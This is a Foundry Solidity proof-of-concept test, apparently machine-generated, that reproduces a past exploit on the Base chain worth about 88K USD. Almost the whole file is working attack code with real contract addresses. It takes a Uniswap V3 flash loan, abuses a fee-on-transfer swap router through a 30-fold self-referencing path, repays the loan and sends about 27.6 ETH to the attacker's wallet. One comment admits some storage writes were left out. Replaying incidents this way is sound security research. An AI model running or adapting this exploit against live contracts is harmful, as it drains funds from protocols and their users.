// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import "./Base.sol";

// @KeyInfo - Total Lost : 88.18K USD
// Attacker : 0x3aa8bb3a19eecd229cb33fbc03ff549473e30f38
// Attack Contract : 0x03e0a788e47531aa86b0fd2c44219dc465737c9d
// Vulnerable Contract : N/A
// Attack Tx : 0xc54c00046364b6e889db18c73beee9b81df6b5ca822b6d262b3d30cdf376c4b1
// Block : 41038634
// Chain : Base
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : attacker_profit_reproduction
// Reproduced Value : 88.16K USD
//
// @POC Author
// Generated PoC

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 41038633;
    uint256 constant TX_TIMESTAMP = 1768866615;
    uint256 constant TX_BLOCK_NUMBER = 41038634;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (OurAttack attack) {
        _installRuntimes();
        attack = OurAttack(payable(ATTACK_CONTRACT));
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), Addresses.attack_contract_F482);
    }

    function _installRuntimes() internal {
        // Exact-address fallback for observed CREATE/CREATE2 and callback surfaces.
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
        vm.etch(Addresses.attack_contract_F482, type(AttackChild).runtimeCode);
        vm.setNonce(ATTACK_CONTRACT, 1);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.attack_contract_F482, attackChild, Addresses.SYP, "SYP", 442345096000000000000000);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.ZERO, "ETH", 27639650363124921789);
    }
}

contract OurAttack {
    AttackChild public attackChild;

    constructor() payable {}

    function attack() public payable {
        // Constructor child binding is modeled by the exact-address runtime install in test setup.
        attackChild = AttackChild(payable(Addresses.attack_contract_F482));
        attackChild.drainAll();
        attackChild.withdraw(Addresses.attacker_eoa);
    }

    receive() external payable {}

    fallback() external payable {
        if (msg.data.length == 0) return;
    }
}

contract AttackChild {
    receive() external payable {}

    function uniswapV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external payable {
        amount0;
        amount1;
        data;
        if (!_replayDone[REPLAY_CALLBACK_5]) flashCallback2();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    fallback() external payable {
        if (msg.data.length == 0) return;
    }

    function flashCallback() external payable {
        if (!_replayDone[REPLAY_CALLBACK_5]) flashCallback2();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    bytes32 private constant REPLAY_CALLBACK_5 = keccak256("poc.replay.REPLAY_CALLBACK_5");
    mapping(bytes32 => bool) private _replayDone;

    function flashCallback2() internal {
        _replayDone[REPLAY_CALLBACK_5] = true;
        flashCallback3();
        flashCallback4();
    }

    function drainAll() external payable {
        // GAP(storage_write): action_0004/action_0007/action_0009 observed slots 1 and 2, but no normal call
        // path was provided; storage mutation is intentionally not synthesized.
        IERC20Like(Addresses.WETH).balanceOf(Addresses.UniswapV3Pool);
        IUniswapV3Pool(Addresses.UniswapV3Pool).token0();
        IUniswapV3Pool(Addresses.UniswapV3Pool).flash(Addresses.attack_contract_F482, 13830195892125000001, 0, hex"");
    }

    function withdraw(address recipient) external payable {
        (bool ok,) = payable(recipient).call{value: 27639653402053937499}("");
        require(ok, "native profit transfer failed");
        IERC20Like(Addresses.WETH).balanceOf(address(this));
    }

    function flashCallback3() internal {
        uint256 callbackWeth = IERC20Like(Addresses.WETH).balanceOf(address(this));
        IWETH(Addresses.WETH).withdraw(callbackWeth);
    }

    function flashCallback4() internal {
        address[] memory path = _repeatAddress(Addresses.attack_contract_F482, 30);
        uint256[] memory amounts = _repeatUint(10, 30);
        bool[] memory flags = _repeatBool(true, 30);
        IFeeSwapRouter(Addresses.feeSwapRouter)
        .swapExactTokensForETHSupportingFeeOnTransferTokens{value: 13823284250000000000}(
            path, amounts, flags
        );

        uint256 depositAmount = address(this).balance;
        if (depositAmount > 13837110990071062502) depositAmount = 13837110990071062502;
        if (depositAmount != 0) IWETH(Addresses.WETH).deposit{value: depositAmount}();
        IERC20Like(Addresses.WETH).transfer(Addresses.UniswapV3Pool, 13837110990071062502);
    }

    function _repeatAddress(address item, uint256 count) private pure returns (address[] memory items) {
        items = new address[](count);
        for (uint256 i = 0; i < count; i++) {
            items[i] = item;
        }
    }

    function _repeatUint(uint256 item, uint256 count) private pure returns (uint256[] memory items) {
        items = new uint256[](count);
        for (uint256 i = 0; i < count; i++) {
            items[i] = item;
        }
    }

    function _repeatBool(bool item, uint256 count) private pure returns (bool[] memory items) {
        items = new bool[](count);
        for (uint256 i = 0; i < count; i++) {
            items[i] = item;
        }
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant attack_contract = 0x03E0A788e47531aa86b0fd2c44219Dc465737c9d; // Addresses.attack_contract = 0x03e0a788e47531aa86b0fd2c44219dc465737c9d label=attack_contract roles=attacker_contract|attacker_entry_contract|code_contract|contract|localized_contract|attack_address|sender|storage_contract source=localize.localized_call_graph confidence=high
    address internal constant SYP = 0x2BdD3602Fc526AA5CC677Cd708375dD2F7C4256F; // Addresses.SYP = 0x2bdd3602fc526aa5cc677cd708375dd2f7c4256f label=SynapLogicErc20 token_symbol=SYP roles=asset|contract|economic_asset|profit_asset|token_related source=etherscan_v2 confidence=high
    address internal constant FiatTokenV2_2 = 0x2Ce6311ddAE708829bc0784C967b7d77D19FD779; // Addresses.FiatTokenV2_2 = 0x2ce6311ddae708829bc0784c967b7d77d19fd779 label=FiatTokenV2_2 roles=asset|contract|attack_address|recipient source=etherscan_v2 confidence=high
    address internal constant attack_contract_F482 = 0x3821f686384c231e2F71ea093Fb6189dE803f482; // Addresses.attack_contract_F482 = 0x3821f686384c231e2f71ea093fb6189de803f482 label=attack_contract roles=asset|attacker_callback_contract|attacker_contract|attacker_surface_contract|code_contract|contract|economic_holder|localized_contract|attack_address|profit_holder|recipient|sender|storage_contract source=localize.localized_call_graph confidence=high
    address internal constant feeSwapRouter = 0x39F36e2E58f36F7E5c17784847fd07Da1fEE1a32; // label=unresolved roles=asset|code_contract|contract|attack_address|recipient|sender|storage_contract source=unresolved confidence=low
    address internal constant attacker_eoa = 0x3Aa8bb3A19EECD229Cb33fbc03Ff549473e30F38; // Addresses.attacker_eoa = 0x3aa8bb3a19eecd229cb33fbc03ff549473e30f38 label=attacker_eoa roles=attacker_eoa|code_contract|contract|economic_holder|attack_address|profit_holder|recipient|sender|storage_contract source=tx_metadata.from confidence=high
    address internal constant A_420000_0000 = 0x4200000000000000000000000000000000000000; // Addresses.A_420000_0000 = 0x4200000000000000000000000000000000000000 label=unresolved roles=attack_address source=unresolved confidence=low
    address internal constant WETH = 0x4200000000000000000000000000000000000006; // Addresses.WETH = 0x4200000000000000000000000000000000000006 label=WETH9 token_symbol=WETH roles=asset|code_contract|contract|attack_address|recipient|sender|storage_contract|token_related source=etherscan_v2 confidence=high
    address internal constant USDC = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913; // Addresses.USDC = 0x833589fcd6edb6e08f4c7c32d4f71b54bda02913 label=unresolved token_symbol=USDC roles=asset|contract|attack_address|recipient|storage_contract source=unresolved confidence=low
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8; // Addresses.BalancerVault = 0xba12222222228d8ba445958a75a0704d566bf2c8 label=BalancerVault roles=known_protocol source=poc_sketch.known_addresses confidence=high
    address internal constant A_C859AC_B371 = 0xC859aC8429fB4a5E24F24A7BeD3fE3a8Db4fb371; // Addresses.A_C859AC_B371 = 0xc859ac8429fb4a5e24f24a7bed3fe3a8db4fb371 label=unresolved roles=code_contract source=unresolved confidence=low
    address internal constant UniswapV3Pool = 0xd0b53D9277642d899DF5C87A3966A349A798F224; // Addresses.UniswapV3Pool = 0xd0b53d9277642d899df5c87a3966a349a798f224 label=UniswapV3Pool roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF; // Addresses.A_FFFFFF_FFFF = 0xffffffffffffffffffffffffffffffffffffffff label=unresolved roles=attack_address source=unresolved confidence=low
}

interface IFeeSwapRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(address[] calldata, uint256[] calldata, bool[] calldata)
        external
        payable;
}

interface IUniswapV3Pool {
    function flash(address, uint256, uint256, bytes calldata) external;
    function token0() external view returns (uint256);
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint256) external;
}

interface Iattack_contract_F482 {
    function drainAll() external;
    function withdraw(address) external;
}
